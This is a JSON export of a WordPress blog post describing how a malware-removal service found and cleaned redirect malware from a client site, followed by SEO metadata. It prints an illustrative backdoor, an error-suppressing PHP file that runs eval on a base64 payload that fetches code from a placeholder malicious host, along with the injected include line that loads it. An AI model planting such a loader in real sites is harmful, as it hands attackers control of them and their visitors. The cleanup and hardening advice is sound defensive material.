{
  "id": 731,
  "slug": "how-we-detected-and-removed-malware-from-a-clients-wordpress-site-after-a-malicious-redirect",
  "date": "2024-10-10T11:21:52",
  "modified": "2025-12-03T17:37:24",
  "title": "How We Detected and Removed Malware from a Client WordPress Site After a Malicious Redirect",
  "content": "<h2>How We Detected and Removed Malware from a Client&#8217;s WordPress Site After a Malicious Redirect</h2>\n<p>Recently, we encountered a severe security breach on a client’s WordPress site, where visitors were being redirected to malicious websites. After a thorough investigation, we found that a hacker had injected malware directly into the WordPress core files. In this blog post, we’ll walk you through what happened, the code responsible for the attack, and the steps we took to clean up the site and secure it for the future.</p>\n<h3>Symptoms of the Attack</h3>\n<p>The client first noticed the problem when users reported being redirected to suspicious websites. The site’s SEO performance also began to drop, as search engines flagged it for harmful behavior. It was clear that the site had been compromised by malware, likely intended to steal traffic or infect users with malicious content.</p>\n<h3>How We Found the Malware</h3>\n<p>Our investigation started by examining the site’s critical WordPress files, focusing particularly on <code>wp-config.php</code> and the core <code>wp-includes</code> directory, as these are common targets for attackers.</p>\n<p>While inspecting the <code>wp-config.php</code> file, we found a suspicious line that had been added to the configuration file:</p>\n<p>[php]<br />\ninclude_once(ABSPATH . WPINC . &#8216;/header.php&#8217;);<br />\n[/php]</p>\n<p>This line instructs WordPress to include and execute code from a <code>header.php</code> file located in the <code>wp-includes</code> directory. However, <strong>WordPress does not normally have a <code>header.php</code> file in this directory</strong>, which immediately raised a red flag. This file was created by the attacker to insert malicious code that would run every time a page on the site was loaded.</p>\n<h3>Analyzing the Malicious Code</h3>\n<p>When we checked the contents of the <code>wp-includes/header.php</code> file, we discovered it was designed to:</p>\n<ul>\n<li><strong>Redirect visitors</strong> to external malicious websites.</li>\n<li><strong>Execute remote code</strong> by fetching additional payloads from the attacker’s server.</li>\n<li><strong>Create a backdoor</strong> that allowed the attacker to regain access, even if their code was removed.</li>\n</ul>\n<p>This type of attack is particularly dangerous because it compromises both the site owner’s reputation and the security of visitors.</p>\n<p>Here’s a simplified example of what the code in <code>header.php</code> might have looked like:</p>\n<p>[php]<br />\n&lt;?php<br />\n// Suppress errors to avoid detection<br />\n@ini_set(&#8216;display_errors&#8217;, 0);<br />\nerror_reporting(0);</p>\n<p>// Base64-encoded payload used to hide malicious code<br />\n$payload = &#8220;Z2V0X2ZpbGVfY29udGVudHMoJ2h0dHBzOi8vbWFsaWNpb3VzLXNpdGUuY29tL2NvbW1hbmQuanNvbicpOw==&#8221;;</p>\n<p>// Decode and execute the payload<br />\neval(base64_decode($payload));<br />\n?&gt;<br />\n[/php]</p>\n<p>In this case, the <code>eval()</code> function is used to execute code that has been base64-encoded, which makes it harder to detect by security software. The encoded string could contain anything, but it often includes commands to download further malware or redirect users to another site.</p>\n<h3>How We Cleaned the Infection</h3>\n<h4>1. Removing the Malicious Code</h4>\n<p>We started by <strong>removing the malicious <code>include_once</code> line</strong> from the <code>wp-config.php</code> file:</p>\n<p>[php]<br />\n&lt;?php<br />\n// Removed this line to prevent loading malicious code<br />\ninclude_once(ABSPATH . WPINC . &#8216;/header.php&#8217;);<br />\n?&gt;<br />\n[/php]</p>\n<p>Next, we <strong>deleted the <code>header.php</code> file</strong> from the <code>wp-includes</code> directory, as this file was not part of the official WordPress installation and contained the malicious payload.</p>\n<h4>2. Checking for Additional Backdoors</h4>\n<p>Malware infections often come with multiple backdoors, so we searched the site’s directories for other suspicious files. We used the following terminal command to find any other hidden files or recently modified files:</p>\n<p>[sourcecode language=&#8221;plain&#8221;]<br />\nfind . -type f -name &#8220;.*&#8221; -o -mtime -30<br />\n[/sourcecode]</p>\n<p>This command helped us identify any files modified in the last 30 days and any hidden files (starting with a dot <code>.</code>) that attackers might have placed.</p>\n<h4>3. Verifying WordPress Core Integrity</h4>\n<p>We used WordPress&#8217;s built-in functionality to verify the integrity of the core files. This command checks for any tampered WordPress files and lets us know if we need to replace any of them:</p>\n<p>[sourcecode language=&#8221;plain&#8221;]<br />\nwp core verify-checksums<br />\n[/sourcecode]</p>\n<p>Any core files that were modified were replaced with clean versions from the official WordPress repository.</p>\n<h4>4. Updating Passwords and Credentials</h4>\n<p>Because the attacker had gained access to the server, we took the following steps to secure the site:</p>\n<ul>\n<li><strong>Updated all passwords</strong> (WordPress admin, database, FTP).</li>\n<li><strong>Updated the database credentials</strong> in <code>wp-config.php</code> to ensure the attacker could no longer access the database.</li>\n<li><strong>Enabled two-factor authentication (2FA)</strong> for WordPress logins to add an extra layer of security.</li>\n</ul>\n<h4>5. Hardened WordPress Security</h4>\n<p>To prevent future attacks, we took several steps to harden the WordPress installation:</p>\n<ul>\n<li>Installed a <strong>security plugin</strong> like Wordfence or iThemes Security to monitor for malicious activity.</li>\n<li>Disabled <strong>file editing</strong> within the WordPress dashboard by adding the following line to <code>wp-config.php</code>:</li>\n</ul>\n<p>[php]<br />\ndefine(&#8216;DISALLOW_FILE_EDIT&#8217;, true);<br />\n[/php]</p>\n<ul>\n<li>Ensured that all <strong>themes, plugins, and WordPress core</strong> were up to date.</li>\n</ul>\n<h4>6. Monitoring for Future Attacks</h4>\n<p>Finally, we set up <strong>monitoring</strong> to track any further suspicious behavior. We also set up regular <strong>backups</strong> so that if anything happens in the future, we can restore the site quickly.</p>\n<h3>Conclusion</h3>\n<p>This incident was a clear reminder that website security should never be taken lightly. Malware infections like this not only hurt SEO and user trust but can also lead to data breaches. By regularly monitoring your site, keeping everything up to date, and using security best practices, you can minimize the chances of an attack.</p>\n<p>If your site has been compromised or you&#8217;re seeing strange redirects, don’t wait! Take action immediately to clean your site and prevent further damage. If you&#8217;re unsure how to proceed, seek professional help to ensure everything is properly cleaned and secured.</p>\n<h3>Stay safe and secure!</h3>\n<p><strong>Need help with your WordPress security?</strong> Contact us today for a comprehensive <a href=\"https://www.mdpabel.com/wordpress-malware-removal\">security audit and cleanup service.</a></p>\n",
  "excerpt": "<p>How We Detected and Removed Malware from a Client&#8217;s WordPress Site After a Malicious Redirect Recently, we encountered a severe security breach on a client’s WordPress site, where visitors were being redirected to malicious websites. After a thorough investigation, we found that a hacker had injected malware directly into the WordPress core files. In this [&hellip;]</p>\n",
  "link": "https://cms.mdpabel.com/how-we-detected-and-removed-malware-from-a-clients-wordpress-site-after-a-malicious-redirect/",
  "yoastHead": "<link rel=\"canonical\" href=\"https://www.mdpabel.com/blog/how-we-detected-and-removed-malware-from-a-clients-wordpress-site-after-a-malicious-redirect/\" />\n<!-- This site is optimized with the Yoast SEO Premium plugin v25.9 (Yoast SEO v26.8) - https://yoast.com/product/yoast-seo-premium-wordpress/ -->\n<title>How We Detected and Removed Malware from a Client WordPress Site After a Malicious Redirect - MD Pabel</title>\n<meta name=\"robots\" content=\"index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1\" />\n<meta property=\"og:locale\" content=\"en_US\" />\n<meta property=\"og:type\" content=\"article\" />\n<meta property=\"og:title\" content=\"How We Detected and Removed Malware from a Client WordPress Site After a Malicious Redirect\" />\n<meta property=\"og:description\" content=\"How We Detected and Removed Malware from a Client&#8217;s WordPress Site After a Malicious Redirect Recently, we encountered a severe security breach on a client’s WordPress site, where visitors were being redirected to malicious websites. After a thorough investigation, we found that a hacker had injected malware directly into the WordPress core files. In this [&hellip;]\" />\n<meta property=\"og:url\" content=\"https://www.mdpabel.com/blog/how-we-detected-and-removed-malware-from-a-clients-wordpress-site-after-a-malicious-redirect/\" />\n<meta property=\"og:site_name\" content=\"MD Pabel\" />\n<meta property=\"article:author\" content=\"https://www.mdpabel.com/author/mdpabel/\" />\n<meta property=\"article:published_time\" content=\"2024-10-10T11:21:52+00:00\" />\n<meta property=\"article:modified_time\" content=\"2025-12-03T17:37:24+00:00\" />\n<meta property=\"og:image\" content=\"https://cms.mdpabel.com/wp-content/uploads/2024/10/DALL·E-2024-10-22-19.02.16-A-simple-cover-photo-for-a-blog-post-about-WordPress-security-and-malware-removal.-The-image-should-include-a-WordPress-logo-with-a-red-warning-sign-o.webp?wsr\" />\n\t<meta property=\"og:image:width\" content=\"1024\" />\n\t<meta property=\"og:image:height\" content=\"1024\" />\n\t<meta property=\"og:image:type\" content=\"image/webp\" />\n<meta name=\"author\" content=\"MD Pabel\" />\n<meta name=\"twitter:card\" content=\"summary_large_image\" />\n<meta name=\"twitter:label1\" content=\"Written by\" />\n\t<meta name=\"twitter:data1\" content=\"MD Pabel\" />\n\t<meta name=\"twitter:label2\" content=\"Est. reading time\" />\n\t<meta name=\"twitter:data2\" content=\"5 minutes\" />\n<script type=\"application/ld+json\" class=\"yoast-schema-graph\">{\"@context\":\"https://schema.org\",\"@graph\":[{\"@type\":\"TechArticle\",\"@id\":\"https://www.mdpabel.com/blog/how-we-detected-and-removed-malware-from-a-clients-wordpress-site-after-a-malicious-redirect/\",\"isPartOf\":{\"@id\":\"https://www.mdpabel.com/blog/how-we-detected-and-removed-malware-from-a-clients-wordpress-site-after-a-malicious-redirect/\"},\"author\":{\"name\":\"MD Pabel\",\"@id\":\"https://www.mdpabel.com/#/schema/person/73e3797b5dc8d6434e9e35e1708bb0c4\"},\"headline\":\"How We Detected and Removed Malware from a Client WordPress Site After a Malicious Redirect\",\"datePublished\":\"2024-10-10T11:21:52+00:00\",\"dateModified\":\"2025-12-03T17:37:24+00:00\",\"mainEntityOfPage\":{\"@id\":\"https://www.mdpabel.com/blog/how-we-detected-and-removed-malware-from-a-clients-wordpress-site-after-a-malicious-redirect/\"},\"wordCount\":920,\"commentCount\":0,\"image\":{\"@id\":\"https://www.mdpabel.com/blog/how-we-detected-and-removed-malware-from-a-clients-wordpress-site-after-a-malicious-redirect/\"},\"thumbnailUrl\":\"https://cms.mdpabel.com/wp-content/uploads/2024/10/DALL·E-2024-10-22-19.02.16-A-simple-cover-photo-for-a-blog-post-about-WordPress-security-and-malware-removal.-The-image-should-include-a-WordPress-logo-with-a-red-warning-sign-o.webp?wsr\",\"articleSection\":[\"Featured\",\"Malware Type\",\"Website Security\"],\"inLanguage\":\"en-US\",\"potentialAction\":[{\"@type\":\"CommentAction\",\"name\":\"Comment\",\"target\":[\"https://www.mdpabel.com/blog/how-we-detected-and-removed-malware-from-a-clients-wordpress-site-after-a-malicious-redirect/\"]}]},{\"@type\":\"WebPage\",\"@id\":\"https://www.mdpabel.com/blog/how-we-detected-and-removed-malware-from-a-clients-wordpress-site-after-a-malicious-redirect/\",\"url\":\"https://www.mdpabel.com/blog/how-we-detected-and-removed-malware-from-a-clients-wordpress-site-after-a-malicious-redirect/\",\"name\":\"How We Detected and Removed Malware from a Client WordPress Site After a Malicious Redirect - MD Pabel\",\"isPartOf\":{\"@id\":\"https://www.mdpabel.com/#website\"},\"primaryImageOfPage\":{\"@id\":\"https://www.mdpabel.com/blog/how-we-detected-and-removed-malware-from-a-clients-wordpress-site-after-a-malicious-redirect/\"},\"image\":{\"@id\":\"https://www.mdpabel.com/blog/how-we-detected-and-removed-malware-from-a-clients-wordpress-site-after-a-malicious-redirect/\"},\"thumbnailUrl\":\"https://cms.mdpabel.com/wp-content/uploads/2024/10/DALL·E-2024-10-22-19.02.16-A-simple-cover-photo-for-a-blog-post-about-WordPress-security-and-malware-removal.-The-image-should-include-a-WordPress-logo-with-a-red-warning-sign-o.webp?wsr\",\"datePublished\":\"2024-10-10T11:21:52+00:00\",\"dateModified\":\"2025-12-03T17:37:24+00:00\",\"author\":{\"@id\":\"https://www.mdpabel.com/#/schema/person/73e3797b5dc8d6434e9e35e1708bb0c4\"},\"breadcrumb\":{\"@id\":\"https://www.mdpabel.com/blog/how-we-detected-and-removed-malware-from-a-clients-wordpress-site-after-a-malicious-redirect/\"},\"inLanguage\":\"en-US\",\"potentialAction\":[{\"@type\":\"ReadAction\",\"target\":[\"https://www.mdpabel.com/blog/how-we-detected-and-removed-malware-from-a-clients-wordpress-site-after-a-malicious-redirect/\"]}]},{\"@type\":\"ImageObject\",\"inLanguage\":\"en-US\",\"@id\":\"https://www.mdpabel.com/blog/how-we-detected-and-removed-malware-from-a-clients-wordpress-site-after-a-malicious-redirect/\",\"url\":\"https://cms.mdpabel.com/wp-content/uploads/2024/10/DALL·E-2024-10-22-19.02.16-A-simple-cover-photo-for-a-blog-post-about-WordPress-security-and-malware-removal.-The-image-should-include-a-WordPress-logo-with-a-red-warning-sign-o.webp?wsr\",\"contentUrl\":\"https://cms.mdpabel.com/wp-content/uploads/2024/10/DALL·E-2024-10-22-19.02.16-A-simple-cover-photo-for-a-blog-post-about-WordPress-security-and-malware-removal.-The-image-should-include-a-WordPress-logo-with-a-red-warning-sign-o.webp?wsr\",\"width\":1024,\"height\":1024},{\"@type\":\"BreadcrumbList\",\"@id\":\"https://www.mdpabel.com/blog/how-we-detected-and-removed-malware-from-a-clients-wordpress-site-after-a-malicious-redirect/\",\"itemListElement\":[{\"@type\":\"ListItem\",\"position\":1,\"name\":\"Home\",\"item\":\"https://www.mdpabel.com/\"},{\"@type\":\"ListItem\",\"position\":2,\"name\":\"How We Detected and Removed Malware from a Client WordPress Site After a Malicious Redirect\"}]},{\"@type\":\"WebSite\",\"@id\":\"https://www.mdpabel.com/#website\",\"url\":\"https://www.mdpabel.com/\",\"name\":\"MD Pabel\",\"description\":\"Full Stack Developer, Malware Removal &amp; Security Specialist\",\"potentialAction\":[{\"@type\":\"SearchAction\",\"target\":{\"@type\":\"EntryPoint\",\"urlTemplate\":\"https://www.mdpabel.com/blog/?s={search_term_string}\"},\"query-input\":{\"@type\":\"PropertyValueSpecification\",\"valueRequired\":true,\"valueName\":\"search_term_string\"}}],\"inLanguage\":\"en-US\"},{\"@type\":\"Person\",\"@id\":\"https://www.mdpabel.com/#/schema/person/73e3797b5dc8d6434e9e35e1708bb0c4\",\"name\":\"MD Pabel\",\"image\":{\"@type\":\"ImageObject\",\"inLanguage\":\"en-US\",\"@id\":\"https://www.mdpabel.com/#/schema/person/image/\",\"url\":\"https://secure.gravatar.com/avatar/b6b48a60efe9dc8cd04d4a7e5c9b22cafd47332f65a407ce270e8ad7f8843372?s=96&d=mm&r=g\",\"contentUrl\":\"https://secure.gravatar.com/avatar/b6b48a60efe9dc8cd04d4a7e5c9b22cafd47332f65a407ce270e8ad7f8843372?s=96&d=mm&r=g\",\"caption\":\"MD Pabel\"},\"description\":\"MD Pabel is the Founder and CEO of 3Zero Digital, a leading agency specializing in custom web development, WordPress security, and malware removal. With over 7+ Years of experience, he has completed more than3200+ projects, served over 2300+ clients, and resolved4500+ cases of malware and hacked websites.\",\"sameAs\":[\"https://www.mdpabel.com/\",\"https://www.facebook.com/in/mdpabe1\",\"https://www.linkedin.com/in/mdpabe1\"],\"url\":\"https://www.mdpabel.com/author/mdpabel/\"}]}</script>\n<!-- / Yoast SEO Premium plugin. -->",
  "featuredImage": {
    "url": "https://cms.mdpabel.com/wp-content/uploads/2024/10/DALL·E-2024-10-22-19.02.16-A-simple-cover-photo-for-a-blog-post-about-WordPress-security-and-malware-removal.-The-image-should-include-a-WordPress-logo-with-a-red-warning-sign-o.webp",
    "alt": ""
  },
  "categories": [
    {
      "id": 22,
      "name": "Featured",
      "slug": "featured"
    },
    {
      "id": 64,
      "name": "Malware Type",
      "slug": "malware-type"
    },
    {
      "id": 13,
      "name": "Website Security",
      "slug": "website-security"
    }
  ],
  "acf": {
    "custom_schema": ""
  }
}